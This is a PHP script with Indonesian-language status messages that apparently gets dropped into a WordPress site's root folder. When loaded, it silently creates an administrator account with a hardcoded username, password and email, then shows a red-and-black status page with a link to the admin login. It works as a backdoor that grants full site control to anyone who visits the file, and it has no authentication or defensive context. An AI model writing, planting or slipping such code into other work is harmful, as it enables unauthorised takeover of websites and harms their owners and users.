<?php

include 'wp-load.php';

$username = 'goldensky';
$password = 'backuptosite';
$email    = 'golden55@gmail.com';

$message_class = 'info';
$message_icon = '&#x1F6C8;';
$message_title = 'Status Pembuatan Akun';
$message_body = "Memproses...";

if ( !username_exists($username) && !email_exists($email) ) {
    $user_id = wp_create_user($username, $password, $email);

    if ( !is_wp_error($user_id) ) {
        $user = new WP_User($user_id);
        $user->set_role('administrator');

        $message_class = 'success';
        $message_icon = '&#x2705;';
        $message_title = "✅ Akun Berhasil Dibuat!";
        $message_body = "Administrator baru dengan username <strong>$username</strong> berhasil dibuat.<br>Silakan login ke dashboard WordPress Anda.";
    } else {
        $message_class = 'error';
        $message_icon = '&#x26A0;&#xFE0F;';
        $message_title = "⚠️ Gagal Membuat Akun!";
        $message_body = "Kesalahan: " . $user_id->get_error_message();
    }
} else {
    $message_class = 'info';
    $message_icon = '&#x1F6C8;';
    $message_title = "ℹ️ Akun Sudah Ada";
    $message_body = "Pengguna dengan username <strong>$username</strong> atau email <strong>$email</strong> sudah terdaftar.";
}
?>

<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Status Akun WordPress</title>
<style>
    body {
        font-family: 'Segoe UI', sans-serif;
        background: linear-gradient(180deg, #ff0000, #000000);
        color: #fff;
        text-align: center;
        padding: 60px 20px;
        min-height: 100vh;
    }

    .container {
        max-width: 500px;
        margin: auto;
        background: linear-gradient(180deg, #000000, #313131 100%);
        padding: 30px;
        border-radius: 12px;
        box-shadow: 0 0 20px rgba(255,0,0);
        border: 1px solid rgba(255,255,255,0.1);
    }

    h1 {
        margin-bottom: 10px;
    }

    .icon {
        font-size: 48px;
        margin-bottom: 15px;
    }

    .message {
        font-size: 16px;
        line-height: 1.5;
    }

    .success { color: #22c55e; }
    .error { color: #ef4444; }
    .info { color: #3b82f6; }

    .btn {,k
        display: inline-block;
        margin-top: 25px;
        padding: 10px 25px;
        border-radius: 6px;
        text-decoration: none;
        font-weight: bold;
        transition: 0.3s;
    }

    .btn-login {
        background: linear-gradient(180deg, #ff0000, #670000);
        color: #fff;
    }
    .btn-login:hover {
        background: #2563eb;
    }

    /* Bisa dikustomisasi */
    .custom-footer {
        margin-top: 40px;       
        font-size: 14px;
        opacity: 0.7;
    }
</style>
</head>
<body>
    <div class="container <?php echo $message_class; ?>">
        <div class="icon"><?php echo $message_icon; ?></div>
        <h1><?php echo $message_title; ?></h1>
        <div class="message"><?php echo $message_body; ?></div>

        <?php if ($message_class === 'success' || $message_class === 'info') : ?>
            <a href="<?php echo site_url('/wp-login.php'); ?>" class="btn btn-login">Login ke WP Admin</a>
        <?php endif; ?>
    </div>

    <div class="custom-footer">
        &copy; <?php echo date('Y'); ?> | Let's To Access and ??
    </div>
</body>
</html>
